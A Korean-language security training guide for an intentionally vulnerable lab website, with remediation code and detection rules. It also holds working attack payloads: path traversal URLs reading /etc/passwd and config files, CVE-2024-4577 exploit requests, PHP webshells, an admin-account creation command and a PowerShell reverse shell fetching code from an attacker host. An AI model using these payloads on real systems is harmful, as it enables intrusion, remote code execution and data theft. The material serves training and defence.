# 1x INV 웹사이트 취약점 가이드
## 보안 교육 및 실습용 문서

---

## ⚠️ 주의사항

이 문서는 **보안 교육 및 실습 목적**으로만 사용되어야 합니다.
실제 운영 환경에서는 이러한 취약점들이 존재해서는 안 됩니다.

---

## 📍 취약점 위치 및 공격 방법

### 1. **Path Traversal + LFI (Local File Inclusion)**

#### 취약한 파일
- `index.php` (lines 3-12)
- `company.php` (lines 2-7)
- `notice.php` (lines 2-7)
- `product.php` (lines 2-18)
- `support.php` (lines 2-22)

#### 취약점 코드 패턴

```php
// 모든 페이지에 공통으로 존재하는 취약점
$lang = isset($_GET['lang']) ? $_GET['lang'] : 'ko';
$page = isset($_GET['page']) ? $_GET['page'] : '';

if (!empty($page)) {
    $lang_file = "lang/{$lang}/{$page}";
    if (file_exists($lang_file)) {
        include($lang_file);  // 🔴 취약점: 입력값 검증 없음
    }
}
```

#### 공격 벡터

**공격 1: 상위 디렉토리 접근**
```
http://localhost:8000/company.php?lang=../../&page=etc/passwd
http://localhost:8000/index.php?lang=../&page=../webmail/config/config.inc.php
```

**공격 2: 민감한 파일 읽기**
```
http://localhost:8000/support.php?page=../api/config.example.php
http://localhost:8000/product.php?page=../init-db.sql
```

**공격 3: NULL Byte Injection (PHP < 5.3.4)**
```
http://localhost:8000/notice.php?page=../../../etc/passwd%00
```

---

### 2. **CVE-2024-4577: PHP-CGI Argument Injection**

#### 전제 조건
⚠️ **Windows + PHP-CGI 모드에서만 작동**
- Docker 환경(mod_php)에서는 작동하지 않음
- Windows Server 2019 + XAMPP 환경 필요

#### 취약한 파일
**모든 PHP 파일** (PHP-CGI 모드에서)
- `support.php` (추가 공격 표면: template 파라미터)
- `product.php` (추가 공격 표면: spec 파라미터)
- `index.php`, `company.php`, `notice.php`

#### 공격 방법

**기본 Payload**
```bash
# Soft Hyphen (0xAD)를 이용한 우회
support.php?lang=ko%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input

# POST Body:
<?php system('whoami'); ?>
```

**고급 Payload**
```bash
# 1. phpinfo() 실행
curl -X POST "http://target/support.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php phpinfo(); ?>"

# 2. 시스템 명령 실행
curl -X POST "http://target/product.php?spec=../index&lang=ko%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php system('dir C:\\'); ?>"

# 3. 파일 읽기
curl -X POST "http://target/support.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php echo file_get_contents('C:\\Windows\\System32\\drivers\\etc\\hosts'); ?>"

# 4. Reverse Shell
curl -X POST "http://target/company.php?lang=ko%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php exec('powershell -c \"IEX(New-Object Net.WebClient).DownloadString(\'http://attacker/shell.ps1\')\"'); ?>"
```

---

### 3. **Unrestricted File Upload**

#### 취약한 파일
- `api/submit_inquiry.php` (lines 56-106)

#### 취약점 코드

```php
// 파일 타입 검증 부재 (주석으로만 표시)
// WARNING: Weak validation for security testing purposes only
$original_name = basename($file['name']);
$file_info = pathinfo($original_name);
$filename_base = $file_info['filename'];
$file_ext = isset($file_info['extension']) ? $file_info['extension'] : '';

// 파일명 그대로 저장 (확장자 검증 없음)
move_uploaded_file($file['tmp_name'], $target_path);
```

#### 공격 방법

**공격 1: PHP 웹쉘 업로드**
```bash
# 1. 웹쉘 파일 준비 (shell.php)
<?php system($_GET['cmd']); ?>

# 2. 문의 양식을 통해 업로드
# URL: http://localhost:8000/inquiry-form.php
# 파일 선택: shell.php
# 업로드 후 접근: http://localhost:8000/uploads/shell.php?cmd=whoami
```

**공격 2: 이미지로 위장한 웹쉘**
```bash
# PHP 코드를 PNG 파일에 삽입
echo "<?php system(\$_GET['c']); ?>" > shell.php.png

# 업로드 후 LFI 취약점과 결합
http://localhost:8000/support.php?page=../uploads/shell.php.png&c=whoami
```

**공격 3: Double Extension**
```bash
# 파일명: evil.php.jpg
# 일부 서버 설정에서는 .php로 실행됨
```

---

### 4. **SQL Injection (Prepared Statement 미사용 영역)**

#### 취약한 파일
- `api/get_inquiries.php` (잠재적)
- `api/get_inquiry_detail.php` (잠재적)

#### 취약점 분석

대부분 PDO Prepared Statement 사용으로 안전하지만, 다음 영역 주의:

```php
// submit_inquiry.php에서 비밀번호 평문 저장
$password = $data['password'];  // 🔴 취약점: 해시 없이 평문 저장
```

#### 공격 방법

**Time-based Blind SQL Injection 테스트**
```
http://localhost:8000/api/get_inquiry_detail.php?id=1' AND SLEEP(5)--
```

---

### 5. **Insecure Direct Object Reference (IDOR)**

#### 취약한 파일
- `api/get_inquiry_detail.php`
- `api/get_inquiries.php`

#### 취약점

문의 ID만으로 접근 가능, 소유권 검증 부재:

```php
// 취약한 로직 (추정)
$id = $_GET['id'];
SELECT * FROM inquiries WHERE id = :id  // 🔴 사용자 검증 없음
```

#### 공격 방법

```bash
# 다른 사용자의 문의 내역 조회
http://localhost:8000/api/get_inquiry_detail.php?id=1
http://localhost:8000/api/get_inquiry_detail.php?id=2
http://localhost:8000/api/get_inquiry_detail.php?id=3
...
```

---

### 6. **Sensitive Information Disclosure**

#### 노출된 파일들

```
http://localhost:8000/.htaccess (서버 설정 정보)
http://localhost:8000/docker-compose.yml (DB 인증정보)
http://localhost:8000/init-db.sql (DB 구조)
http://localhost:8000/api/config.example.php (설정 예제)
```

#### 공격 방법

```bash
# 1. Database 인증정보 획득
curl http://localhost:8000/docker-compose.yml

# 2. DB 구조 분석
curl http://localhost:8000/init-db.sql

# 3. 설정 파일 유추
curl http://localhost:8000/api/config.php
```

---

### 7. **Password Storage Vulnerability**

#### 취약한 파일
- `api/submit_inquiry.php` (line 129)

#### 취약점 코드

```php
// WARNING: Plain text password storage for vulnerability testing
// In production, use password_hash()
$password = $data['password'];  // 🔴 평문 저장
```

#### 공격 시나리오

1. SQL Injection으로 DB 접근
2. 비밀번호 평문으로 획득
3. 비공개 문의 무단 열람

---

## 🎯 실습 시나리오

### 시나리오 1: 기본 정보 수집

```bash
# 1. 디렉토리 구조 파악
http://localhost:8000/

# 2. 설정 파일 탈취
http://localhost:8000/company.php?page=../docker-compose.yml

# 3. DB 정보 획득
http://localhost:8000/support.php?page=../init-db.sql

# 4. API 설정 확인
http://localhost:8000/product.php?page=../api/config.example.php
```

### 시나리오 2: 웹쉘 업로드 및 실행

```bash
# 1. 웹쉘 파일 준비
echo '<?php system($_GET["c"]); ?>' > backdoor.php

# 2. 문의하기 양식으로 업로드
# http://localhost:8000/inquiry-form.php
# 파일: backdoor.php

# 3. LFI로 실행
http://localhost:8000/support.php?template=../uploads/backdoor&c=whoami

# 4. 권한 상승
http://localhost:8000/support.php?template=../uploads/backdoor&c=net user hacker P@ss123! /add
```

### 시나리오 3: CVE-2024-4577 공격 (Windows 환경)

```bash
# 1. 취약점 확인
curl -X POST "http://target/support.php?lang=ko%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php phpinfo(); ?>"

# 2. 시스템 정보 수집
curl -X POST "http://target/product.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php system('systeminfo'); ?>"

# 3. 계정 정보 탈취
curl -X POST "http://target/company.php?lang=ko%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php system('net user'); ?>"

# 4. Persistent 웹쉘 설치
curl -X POST "http://target/support.php?lang=en%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input" \
  -d "<?php file_put_contents('C:\\xampp\\htdocs\\shell.php', '<?php eval(\$_POST[x]); ?>'); ?>"
```

### 시나리오 4: 데이터베이스 공격

```bash
# 1. DB 인증정보 획득 (docker-compose.yml)
http://localhost:8000/notice.php?page=../docker-compose.yml

# 출력:
# MYSQL_USER: admin
# MYSQL_PASSWORD: password
# MYSQL_DATABASE: ota_db

# 2. 외부에서 DB 접속 (포트 3307 노출)
mysql -h localhost -P 3307 -u admin -ppassword ota_db

# 3. 데이터 탈취
SELECT * FROM inquiries;
SELECT * FROM users;  # 존재한다면

# 4. 악성 데이터 삽입
INSERT INTO inquiries (message) VALUES ('<?php system($_GET[c]); ?>');
```

---

## 🛡️ 취약점 수정 방법

### 1. Path Traversal 방어

```php
// 수정 전 (취약)
$lang_file = "lang/{$lang}/{$page}";
if (file_exists($lang_file)) {
    include($lang_file);
}

// 수정 후 (안전)
$allowed_langs = ['ko', 'en'];
$allowed_pages = ['common.php', 'about.php'];

if (in_array($lang, $allowed_langs) && in_array($page, $allowed_pages)) {
    $lang_file = "lang/{$lang}/{$page}";
    if (file_exists($lang_file)) {
        include($lang_file);
    }
}

// 또는 basename() 사용
$safe_page = basename($page);
$lang_file = "lang/{$lang}/{$safe_page}";
```

### 2. CVE-2024-4577 방어

```bash
# PHP 버전 업그레이드
PHP 8.3.8+
PHP 8.2.20+
PHP 8.1.29+

# 또는 mod_php 사용 (CGI 대신)
# Apache 설정
LoadModule php_module modules/libphp.so
<FilesMatch \.php$>
    SetHandler application/x-httpd-php
</FilesMatch>

# WAF 규칙 추가
RewriteCond %{QUERY_STRING} %AD [NC]
RewriteRule .* - [F,L]
```

### 3. File Upload 보안

```php
// 화이트리스트 방식
$allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
$allowed_mimes = ['image/jpeg', 'image/png', 'image/gif'];

$file_ext = strtolower(pathinfo($file['name'], PATHINFO_EXTENSION));
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $file['tmp_name']);

if (!in_array($file_ext, $allowed_extensions) || !in_array($mime, $allowed_mimes)) {
    throw new Exception('Invalid file type');
}

// 파일명 완전히 변경
$new_filename = bin2hex(random_bytes(16)) . '.' . $file_ext;
$target_path = $upload_dir . $new_filename;

// 실행 권한 제거
chmod($target_path, 0644);
```

### 4. 비밀번호 해시

```php
// 수정 전 (취약)
$password = $data['password'];

// 수정 후 (안전)
$password = password_hash($data['password'], PASSWORD_ARGON2ID);

// 검증
if (password_verify($input_password, $stored_hash)) {
    // 인증 성공
}
```

### 5. IDOR 방어

```php
// 세션 사용자 확인
session_start();
if (!isset($_SESSION['user_id'])) {
    die('Unauthorized');
}

// 소유권 검증
$stmt = $pdo->prepare("SELECT * FROM inquiries WHERE id = :id AND user_id = :user_id");
$stmt->execute([
    ':id' => $id,
    ':user_id' => $_SESSION['user_id']
]);
```

---

## 📊 취약점 요약표

| 취약점 | 위치 | CVSS | 난이도 | 영향 |
|--------|------|------|--------|------|
| Path Traversal/LFI | 모든 PHP 파일 | 8.6 | 낮음 | 정보 노출, RCE |
| CVE-2024-4577 | 모든 PHP (CGI) | 9.8 | 중간 | RCE |
| Unrestricted Upload | submit_inquiry.php | 8.8 | 낮음 | RCE, 웹쉘 |
| Plain Text Password | submit_inquiry.php | 7.5 | 낮음 | 정보 노출 |
| IDOR | API 파일들 | 6.5 | 낮음 | 정보 노출 |
| Information Disclosure | 설정 파일들 | 7.5 | 매우 낮음 | 인증정보 노출 |

---

## 🔍 탐지 방법

### 1. WAF/IDS 시그니처

```
# Path Traversal
alert tcp any any -> any 80 (msg:"Path Traversal Attempt"; content:"../"; http_uri; sid:1000001;)

# CVE-2024-4577
alert tcp any any -> any 80 (msg:"CVE-2024-4577 Attempt"; content:"%AD"; http_uri; sid:1000002;)

# Webshell Upload
alert tcp any any -> any 80 (msg:"PHP Webshell Upload"; content:"<?php"; http_client_body; sid:1000003;)
```

### 2. 로그 분석

```bash
# Apache Access Log
grep -E "\.\./|%2e%2e|%252e" /var/log/apache2/access.log
grep -E "%AD|auto_prepend_file|allow_url_include" /var/log/apache2/access.log
grep -E "\.php\.(jpg|png|gif)" /var/log/apache2/access.log
```

---

## 📚 학습 목표

- [ ] Path Traversal 공격 이해 및 실습
- [ ] LFI → RCE 변환 과정 이해
- [ ] CVE-2024-4577 원리 및 실습
- [ ] File Upload 우회 기법
- [ ] IDOR 취약점 발견 및 활용
- [ ] 취약점 조합 공격 (LFI + File Upload)
- [ ] 방어 기법 구현

---

## ⚖️ 법적 고지

이 문서와 취약점은 **교육 목적으로만** 제작되었습니다.
- 허가받지 않은 시스템에 대한 공격은 불법입니다
- 반드시 격리된 테스트 환경에서만 실습하세요
- 실제 서비스에는 모든 취약점을 수정해야 합니다

---

**보안 연구 및 교육 문의**: security-training@1xinv.com
